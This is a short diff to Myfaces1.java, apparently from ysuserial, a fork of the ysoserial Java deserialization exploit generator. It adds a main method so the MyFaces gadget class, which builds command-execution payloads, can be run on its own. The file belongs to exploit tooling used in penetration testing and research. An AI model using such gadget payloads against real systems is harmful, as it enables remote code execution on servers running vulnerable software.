@@ -19,6 +19,7 @@ import org.su18.ysuserial.payloads.ObjectPayload;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
+import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 
@@ -42,6 +43,9 @@ import org.su18.ysuserial.payloads.util.Reflections;
 @Dependencies
 @Authors({Authors.MBECHLER})
 public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Myfaces1.class, args);
+	}
 
 	public Object getObject(String command) throws Exception {
 		return makeExpressionPayload(command);
